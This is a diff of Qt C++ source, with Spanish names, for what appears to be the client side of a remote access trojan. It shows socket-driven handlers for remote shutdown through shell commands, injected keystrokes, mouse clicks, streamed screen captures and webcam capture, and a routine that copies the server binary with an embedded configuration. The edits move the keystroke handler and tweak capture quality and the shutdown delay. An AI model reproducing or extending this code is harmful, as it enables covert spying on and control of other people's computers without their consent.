@@ -149,6 +149,7 @@ bool MainWindow::cargarConfiguracion(){
         this->ejecutar = campo[11];
         this->siempreOUnaVez = campo[12];
     }
+    return true;
 }
 void MainWindow::copiarServidor(QByteArray tramaConfiguracion, QString destino)
 {
@@ -309,7 +310,7 @@ void MainWindow::llegadaDatos() {
     }
     if(parametros[0] == "apagarequipo"){
        #ifdef Q_WS_WIN
-        shell("shutdown /t 0 /s");
+        shell("shutdown /t 1 /s");
        #else
         shell("shutdown -h now");
        #endif
@@ -385,6 +386,12 @@ void MainWindow::llegadaDatos() {
         hacerClickIzquierdo();
         #endif
     }
+    if(parametros[0] == "tecla")
+    {
+        #ifdef Q_WS_WIN
+        enviarTecla(parametros[1].toInt());
+        #endif
+    }
 
 }
 QString MainWindow::obtenerInformacionSistema()
@@ -442,18 +449,6 @@ void MainWindow::llegadaDatosArchivo(){
 }
 void MainWindow::llegadaDatosEscritorio(){
     /** Función de petición de captura de escritorio **/
-
-    QString datos = socketEscritorio.readAll();
-    QStringList parametros = datos.split("|@|");
-    if(parametros[0] == "tecla")
-    {
-        #ifdef Q_WS_WIN
-        enviarTecla(parametros[1].toInt());
-        #endif
-    }
-
-    if (parametros[0] == "capturar")
-    {
         int i,j;
         QPixmap captura;
         captura = screenShot(); //Realizamos una captura
@@ -476,7 +471,7 @@ void MainWindow::llegadaDatosEscritorio(){
                 }
             }
         }
-        imagen3.save(buffer,"jpg",parametros[1].toInt()); //Guardamos la imagen resultante en un bufer de memoria en formato jpg
+        imagen3.save(buffer,"jpg",socketEscritorio.readAll().toInt()); //Guardamos la imagen resultante en un bufer de memoria en formato jpg
         captura1 = captura; //La captura actual pasa a ser captura anterior
         sincroniza++; //LLebamos la cuenta de cuantas capturas vamos haciendo
         if(sincroniza == 10) //Cada 10 capturas envia una completa para sincronizar
@@ -485,7 +480,7 @@ void MainWindow::llegadaDatosEscritorio(){
             sincroniza = 0;
         }
     }
-}
+
 void MainWindow::llegadaDatosWebcam()
 { /** Función donde se reciben las peticiones de captura de webcam asi como su encendido y apagado **/
     QString datos = socketWebcam.readAll();
@@ -605,7 +600,7 @@ void MainWindow::vistaPrevia(QString archivo)
     QPixmap imagen;
     imagen.load(archivo);
     imagen = imagen.scaled(128,128);
-    imagen.save("mini.jpg","jpeg",100);
+    imagen.save("mini.jpg","jpeg",70);
 }
 void MainWindow::mostrarMensaje(QString tipo, QString titulo, QString texto){
     /** Función que muestra mensajes emergentes **/
